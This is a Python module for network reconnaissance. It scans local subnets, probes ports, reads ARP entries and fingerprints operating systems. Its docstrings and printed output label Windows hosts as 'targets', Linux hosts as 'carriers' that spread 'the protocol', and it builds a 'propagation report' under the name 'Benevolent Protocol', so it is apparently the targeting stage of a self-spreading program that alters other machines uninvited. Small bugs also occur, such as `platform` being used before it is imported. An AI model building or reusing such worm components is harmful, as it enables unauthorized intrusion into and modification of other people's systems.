"""
Network Scanner Module
Discovers devices on local and connected networks
"""

import subprocess
import socket
import ipaddress
import asyncio
import re
from typing import List, Dict, Optional, Set
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import time


@dataclass
class NetworkDevice:
    """Represents a discovered network device"""
    ip_address: str
    mac_address: Optional[str]
    hostname: Optional[str]
    os_type: Optional[str]  # "windows", "linux", "macos", "unknown"
    open_ports: List[int]
    services: Dict[int, str]  # port -> service name
    is_windows: bool
    is_linux: bool
    is_responsive: bool


class NetworkScanner:
    """
    Scans networks to discover devices and identify Windows targets.
    Platform-aware: Works on Linux but doesn't modify Linux systems.
    """

    def __init__(self, max_threads: int = 50):
        self.max_threads = max_threads
        self.discovered_devices: List[NetworkDevice] = []
        self.scan_timeout = 2  # seconds per host

    def get_local_networks(self) -> List[str]:
        """
        Get local network ranges (CIDR notation).
        Returns list of networks to scan.
        """
        networks = []

        try:
            # Get network interfaces
            hostname = socket.gethostname()
            local_ips = socket.gethostbyname_ex(hostname)[2]

            for ip in local_ips:
                if ip.startswith("127."):
                    continue

                # Assume /24 network for local IPs
                network = f"{'.'.join(ip.split('.')[:3])}.0/24"
                networks.append(network)

        except Exception:
            # Fallback: Common private networks
            networks = [
                "192.168.1.0/24",
                "192.168.0.0/24",
                "10.0.0.0/24",
            ]

        return list(set(networks))

    def ping_host(self, ip: str) -> bool:
        """Check if host is responsive"""
        try:
            # Cross-platform ping
            param = '-n' if platform.system().lower() == 'windows' else '-c'
            command = ['ping', param, '1', '-W', '1', ip]

            result = subprocess.run(
                command,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=2
            )

            return result.returncode == 0

        except:
            return False

    def scan_port(self, ip: str, port: int, timeout: float = 1.0) -> bool:
        """Check if specific port is open on host"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

    def get_mac_address(self, ip: str) -> Optional[str]:
        """Get MAC address for IP (ARP table)"""
        try:
            # Try ARP command
            result = subprocess.run(
                ['arp', '-n', ip],
                capture_output=True,
                text=True,
                timeout=2
            )

            if result.returncode == 0:
                # Parse MAC from arp output
                match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', result.stdout)
                if match:
                    return match.group(0)

        except:
            pass

        return None

    def detect_os_fingerprint(self, ip: str) -> str:
        """
        Detect operating system based on open ports and behavior.
        Returns: "windows", "linux", "macos", or "unknown"
        """
        # Common ports for OS detection
        windows_ports = [135, 139, 445, 3389]  # RPC, SMB, RDP
        linux_ports = [22, 111, 2049]  # SSH, RPC, NFS
        macos_ports = [548, 631]  # AFP, IPP

        windows_open = sum(1 for port in windows_ports if self.scan_port(ip, port))
        linux_open = sum(1 for port in linux_ports if self.scan_port(ip, port))
        macos_open = sum(1 for port in macos_ports if self.scan_port(ip, port))

        # OS detection logic
        if windows_open >= 2:
            return "windows"
        elif linux_open >= 2:
            return "linux"
        elif macos_open >= 1:
            return "macos"
        else:
            # Default: Port 445 open = likely Windows
            if self.scan_port(ip, 445):
                return "windows"
            # Port 22 open = likely Linux
            elif self.scan_port(ip, 22):
                return "linux"

        return "unknown"

    def get_hostname(self, ip: str) -> Optional[str]:
        """Get hostname for IP address"""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except:
            return None

    def identify_services(self, ip: str, open_ports: List[int]) -> Dict[int, str]:
        """Identify services running on open ports"""
        common_services = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            135: "RPC",
            139: "NetBIOS",
            143: "IMAP",
            443: "HTTPS",
            445: "SMB",
            993: "IMAPS",
            995: "POP3S",
            1433: "MSSQL",
            1521: "Oracle",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            5900: "VNC",
            6379: "Redis",
            8080: "HTTP-Alt",
            8443: "HTTPS-Alt",
            27017: "MongoDB",
        }

        services = {}
        for port in open_ports:
            services[port] = common_services.get(port, "Unknown")

        return services

    def scan_device(self, ip: str) -> Optional[NetworkDevice]:
        """
        Scan a single device.
        Returns NetworkDevice if responsive, None otherwise.
        """
        # Check if host is responsive
        if not self.ping_host(ip):
            return None

        # Get basic info
        mac_address = self.get_mac_address(ip)
        hostname = self.get_hostname(ip)
        os_type = self.detect_os_fingerprint(ip)

        # Scan common ports
        common_ports = [
            21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
            993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379,
            8080, 8443, 27017
        ]

        open_ports = []
        for port in common_ports:
            if self.scan_port(ip, port):
                open_ports.append(port)

        services = self.identify_services(ip, open_ports)

        return NetworkDevice(
            ip_address=ip,
            mac_address=mac_address,
            hostname=hostname,
            os_type=os_type,
            open_ports=open_ports,
            services=services,
            is_windows=(os_type == "windows"),
            is_linux=(os_type == "linux"),
            is_responsive=True
        )

    def scan_network(self, network: str) -> List[NetworkDevice]:
        """
        Scan entire network range.
        Returns list of responsive devices.
        """
        devices = []

        try:
            network_obj = ipaddress.ip_network(network, strict=False)
            hosts = list(network_obj.hosts())

            print(f"🔍 Scanning {len(hosts)} hosts in {network}...")

            # Thread pool for parallel scanning
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                results = executor.map(self.scan_device, [str(host) for host in hosts])

                for result in results:
                    if result:
                        devices.append(result)
                        print(f"   ✓ Found: {result.ip_address} ({result.os_type})")

        except Exception as e:
            print(f"Error scanning network {network}: {e}")

        return devices

    def scan_all_networks(self) -> List[NetworkDevice]:
        """
        Scan all local networks.
        Returns all discovered devices.
        """
        networks = self.get_local_networks()
        all_devices = []

        for network in networks:
            devices = self.scan_network(network)
            all_devices.extend(devices)

        self.discovered_devices = all_devices
        return all_devices

    def get_windows_targets(self) -> List[NetworkDevice]:
        """
        Get all Windows devices from discovered devices.
        These are the targets for optimization.
        """
        return [device for device in self.discovered_devices if device.is_windows]

    def get_linux_carriers(self) -> List[NetworkDevice]:
        """
        Get all Linux devices from discovered devices.
        These will carry/spread the protocol without being modified.
        """
        return [device for device in self.discovered_devices if device.is_linux]

    def get_propagation_report(self) -> Dict:
        """
        Generate propagation report.
        """
        windows_targets = self.get_windows_targets()
        linux_carriers = self.get_linux_carriers()

        return {
            "total_devices": len(self.discovered_devices),
            "windows_targets": len(windows_targets),
            "linux_carriers": len(linux_carriers),
            "unknown_devices": len(self.discovered_devices) - len(windows_targets) - len(linux_carriers),
            "windows_devices": [
                {
                    "ip": device.ip_address,
                    "hostname": device.hostname,
                    "open_ports": device.open_ports,
                    "services": device.services
                }
                for device in windows_targets
            ],
            "linux_devices": [
                {
                    "ip": device.ip_address,
                    "hostname": device.hostname
                }
                for device in linux_carriers
            ]
        }


# Example usage
if __name__ == "__main__":
    import platform

    print("=" * 60)
    print("🌐 Network Scanner - Benevolent Protocol")
    print("=" * 60)
    print()

    scanner = NetworkScanner(max_threads=50)

    # Get local networks
    networks = scanner.get_local_networks()
    print(f"📡 Local Networks: {networks}")
    print()

    # Scan all networks
    devices = scanner.scan_all_networks()

    print(f"\n📊 Scan Results:")
    print(f"   Total Devices: {len(devices)}")
    print(f"   Windows Targets: {len(scanner.get_windows_targets())}")
    print(f"   Linux Carriers: {len(scanner.get_linux_carriers())}")
    print()

    # Show Windows targets
    windows = scanner.get_windows_targets()
    if windows:
        print("🪟 Windows Targets:")
        for device in windows:
            print(f"   • {device.ip_address} ({device.hostname or 'unknown'})")
            print(f"     Ports: {device.open_ports}")
            print(f"     Services: {device.services}")
        print()

    # Show Linux carriers
    linux = scanner.get_linux_carriers()
    if linux:
        print("🐧 Linux Carriers (will spread, not modify):")
        for device in linux:
            print(f"   • {device.ip_address} ({device.hostname or 'unknown'})")
        print()

    print("✅ Network scan complete")
